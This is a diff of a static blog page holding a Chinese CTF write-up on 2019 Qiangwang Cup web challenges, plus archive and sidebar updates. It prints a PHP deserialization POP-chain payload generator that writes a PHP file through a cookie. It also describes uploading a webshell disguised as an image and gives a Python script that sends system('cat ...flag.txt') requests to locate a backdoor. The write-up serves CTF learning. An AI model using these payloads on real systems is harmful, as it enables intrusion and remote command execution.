@@ -406,7 +406,7 @@ height:50vh;
 <p>再继续审计，可以看到<code>profile.php</code>里面有个<code>upload_img</code>函数和<code>__call</code>函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_img</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;checker)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;checker-&gt;login_check())&#123;</span><br><span class="line">        	$curr_url=<span class="string">"http://"</span>.$_SERVER[<span class="string">'HTTP_HOST'</span>].$_SERVER[<span class="string">'SCRIPT_NAME'</span>].<span class="string">"/index"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;redirect($curr_url,<span class="number">302</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">    	&#125;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES))&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename_tmp=$_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename=md5($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]).<span class="string">".png"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ext_check();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;ext) &#123;</span><br><span class="line">        <span class="keyword">if</span>(getimagesize(<span class="keyword">$this</span>-&gt;filename_tmp)) &#123;</span><br><span class="line">            @copy(<span class="keyword">$this</span>-&gt;filename_tmp, <span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">            @unlink(<span class="keyword">$this</span>-&gt;filename_tmp);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;img=<span class="string">"../upload/$this-&gt;upload_menu/$this-&gt;filename"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;update_img();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;error(<span class="string">'Forbidden type!'</span>, url(<span class="string">'../index'</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;error(<span class="string">'Unknow file type!'</span>, url(<span class="string">'../index'</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;$name&#125;&#125;($arguments);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
 <p>可以看到<code>upload_img</code>函数里面有个<code>copy</code>函数，如果我们能对其<code>filename</code>和<code>filename_tmp</code>参数进行控制，那么我们就可以复制任意文件过去了，接下来就是想办法怎么控制里面的参数了<br>继续进行审计，可以看见<code>__call</code>函数如果我们可以控制<code>name</code>这个参数，我们就有可能调用过去<code>upload_img</code>这个函数了<br>那么怎么触发它呢，在<code>register.php</code>里面，有个<code>__destruct</code>的方法<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;registed)&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checker-&gt;index();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
 <p>而<code>register</code>类里面是没有<code>index</code>方法的，所以，我们就能让他触发过去<code>__call</code>，然后想办法控制参数，让他触发<code>upload_img</code>函数，所以pop链就是<code>__destruct --&gt; __call --&gt; upload_img</code>，最后payload如下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Profile</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checker</span>;</span><br><span class="line">        <span class="keyword">public</span> $index;</span><br><span class="line">        <span class="keyword">public</span> $filename_tmp;</span><br><span class="line">        <span class="keyword">public</span> $filename;</span><br><span class="line">        <span class="keyword">public</span> $ext;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;index = <span class="string">"Ariel"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checker = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filename_tmp = <span class="string">"upload/8b26631219c8f8ecac51b935cc87ccd1/f1f7f21e6c1bee52fad6244963831464.png"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filename = <span class="string">"upload/8b26631219c8f8ecac51b935cc87ccd1/Ariel.php"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;Ariel = <span class="string">"upload_img"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;ext = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"\nok"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Register</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $checker;</span><br><span class="line">        <span class="keyword">public</span> $registed;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;registed = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checker = $name;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $p = <span class="keyword">new</span> Profile();</span><br><span class="line">    $r = <span class="keyword">new</span> Register($p);</span><br><span class="line">    $payload = <span class="keyword">array</span>(<span class="string">"ID"</span> =&gt; <span class="number">1</span>, <span class="string">"payload"</span> =&gt; $r);</span><br><span class="line">    $payload = base64_encode(serialize($payload));</span><br><span class="line">    <span class="keyword">echo</span> $payload . <span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>最后将生成的payload替换到cookie里，就可以成功触发反序列化，生成我们想要的文件<br><img src="/assets/2019qwb/1.png" alt=""><br>接着就能愉快地执行任意命令了  </p>
+<p>先上传一张内容为小马的图片，注意加个图片头，然后将生成的payload替换到cookie里，就可以成功触发反序列化，生成我们想要的文件<br><img src="/assets/2019qwb/1.png" alt=""><br>接着就能愉快地执行任意命令了  </p>
 <h3 id="强网先锋–上单"><a href="#强网先锋–上单" class="headerlink" title="强网先锋–上单"></a>强网先锋–上单</h3><p>这道题一进去就给了一个框架的目录，发现能读的东西还很多，读一下<code>log</code>日志，能读到一句payload，还很熟悉，了解过的都能一下看出来是tp5任意命令执行的漏洞的payload，拿出来直接利用就能拿到flag了<br><img src="/assets/2019qwb/2.png" alt=""></p>
 <h3 id="高明的黑客"><a href="#高明的黑客" class="headerlink" title="高明的黑客"></a>高明的黑客</h3><p>这个进去能下下来一个压缩包，打开看见有3000多个文件，里面一堆的命令执行函数，但是前面又有一些将获得的变量置空的语句，大胆猜测，这中间有一个是真的小马，所以我们现在就是要将他找出来<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> os.listdir(<span class="string">'F:\\hacker\\'</span>):</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'F:\\hacker\\'</span>+i,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data=f.read()</span><br><span class="line">            m=re.findall(<span class="string">r'\$_GET\[[\'"]?(.*?)[\'"?]\]'</span>, data)</span><br><span class="line">            <span class="comment"># print(i)</span></span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> m:</span><br><span class="line">                r=requests.get(url=<span class="string">"http://ip/hacker/"</span>+i+<span class="string">"/?"</span>+k+<span class="string">"=system('cat /var/www/html/ctf/hacker/flag.txt');"</span>)</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"http://ip/hacker/"</span>+i+<span class="string">"/?"</span>+k+<span class="string">"=system('cat /var/www/html/ctf/hacker/flag.txt');"</span></span><br><span class="line">                <span class="keyword">if</span> <span class="string">'Ariel'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                    <span class="keyword">print</span> <span class="string">"[+]find!"</span></span><br><span class="line">                    <span class="keyword">print</span> i + <span class="string">" "</span> + k</span><br><span class="line">                    os._exit(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(e)</span><br></pre></td></tr></table></figure></p>
 <p>找出来可利用的文件就能拿到flag了  </p>
@@ -422,6 +422,11 @@ height:50vh;
     <!-- paginator  -->
     <ul class="post-paginator">
         <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href="/2019/06/26/sql注入汇总/" title="sql注入汇总">
+                    <div class="nextTitle">sql注入汇总</div>
+                </a>
             
         </li>
         <li class="previous">
@@ -1269,9 +1274,76 @@ top:50vh;
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 50
+        Total : 51
         </div>
         <!-- search  -->
         
@@ -1284,6 +1356,11 @@ top:50vh;
     
     <div class="archive-year"> 2019 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/26</span><a class="archive-post-title" href="/2019/06/26/sql注入汇总/">sql注入汇总</a>
+        </li>
     
     
         <li class="archive-post-item">
@@ -1332,12 +1409,17 @@ top:50vh;
     
     
         <li class="archive-post-item">
+            <span class="archive-post-date">04/11</span><a class="archive-post-title" href="/2019/04/11/rips-2017/">rips 2017</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
             <span class="archive-post-date">04/11</span><a class="archive-post-title" href="/2019/04/11/2019西湖论剑web-writeup/">2019西湖论剑web writeup</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">04/11</span><a class="archive-post-title" href="/2019/04/11/rips-2017/">rips 2017</a>
+            <span class="archive-post-date">03/25</span><a class="archive-post-title" href="/2019/03/25/code-breaking-lumenserial/">code breaking lumenserial</a>
         </li>
     
     
@@ -1348,11 +1430,6 @@ top:50vh;
     
         <li class="archive-post-item">
             <span class="archive-post-date">03/25</span><a class="archive-post-title" href="/2019/03/25/2019-0ctf-wp/">2019 0ctf wp</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">03/25</span><a class="archive-post-title" href="/2019/03/25/code-breaking-lumenserial/">code breaking lumenserial</a>
         </li>
     
     
@@ -1402,12 +1479,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">02/24</span><a class="archive-post-title" href="/2019/02/24/2018百越杯wp/">2018百越杯wp</a>
+            <span class="archive-post-date">02/24</span><a class="archive-post-title" href="/2019/02/24/2019tamuctf/">2019tamuctf</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">02/24</span><a class="archive-post-title" href="/2019/02/24/2019tamuctf/">2019tamuctf</a>
+            <span class="archive-post-date">02/24</span><a class="archive-post-title" href="/2019/02/24/2018百越杯wp/">2018百越杯wp</a>
         </li>
     
     
@@ -1549,9 +1626,9 @@ top:50vh;
         <div class="sidebar-panel-tags">
     <div class="sidebar-tags-name">
     
-        <span class="sidebar-tag-name" data-tags="CTF"><span class="iconfont-archer">&#xe606;</span>CTF</span>
-    
         <span class="sidebar-tag-name" data-tags="安恒杯"><span class="iconfont-archer">&#xe606;</span>安恒杯</span>
+    
+        <span class="sidebar-tag-name" data-tags="CTF"><span class="iconfont-archer">&#xe606;</span>CTF</span>
     
         <span class="sidebar-tag-name" data-tags="MongoDB"><span class="iconfont-archer">&#xe606;</span>MongoDB</span>
     
@@ -1559,11 +1636,13 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="php_tricks"><span class="iconfont-archer">&#xe606;</span>php_tricks</span>
     
-        <span class="sidebar-tag-name" data-tags="cve"><span class="iconfont-archer">&#xe606;</span>cve</span>
-    
         <span class="sidebar-tag-name" data-tags="javascript"><span class="iconfont-archer">&#xe606;</span>javascript</span>
     
         <span class="sidebar-tag-name" data-tags="python"><span class="iconfont-archer">&#xe606;</span>python</span>
+    
+        <span class="sidebar-tag-name" data-tags="cve"><span class="iconfont-archer">&#xe606;</span>cve</span>
+    
+        <span class="sidebar-tag-name" data-tags="sql"><span class="iconfont-archer">&#xe606;</span>sql</span>
     
         <span class="sidebar-tag-name" data-tags="xss"><span class="iconfont-archer">&#xe606;</span>xss</span>
     
@@ -1573,9 +1652,9 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="docker"><span class="iconfont-archer">&#xe606;</span>docker</span>
     
-        <span class="sidebar-tag-name" data-tags="xxe"><span class="iconfont-archer">&#xe606;</span>xxe</span>
-    
         <span class="sidebar-tag-name" data-tags="mysql"><span class="iconfont-archer">&#xe606;</span>mysql</span>
+    
+        <span class="sidebar-tag-name" data-tags="xxe"><span class="iconfont-archer">&#xe606;</span>xxe</span>
     
         <span class="sidebar-tag-name" data-tags="RSA"><span class="iconfont-archer">&#xe606;</span>RSA</span>
     
@@ -1616,9 +1695,9 @@ jsonContent:
     
         <span class="sidebar-category-name" data-categories="web/crypto"><span class="iconfont-archer">&#xe60a;</span>web/crypto</span>
     
-        <span class="sidebar-category-name" data-categories="web/misc"><span class="iconfont-archer">&#xe60a;</span>web/misc</span>
-    
         <span class="sidebar-category-name" data-categories="web/crypto/misc"><span class="iconfont-archer">&#xe60a;</span>web/crypto/misc</span>
+    
+        <span class="sidebar-category-name" data-categories="web/misc"><span class="iconfont-archer">&#xe60a;</span>web/misc</span>
     
         <span class="sidebar-category-name" data-categories="web/misc/crypto"><span class="iconfont-archer">&#xe60a;</span>web/misc/crypto</span>
     
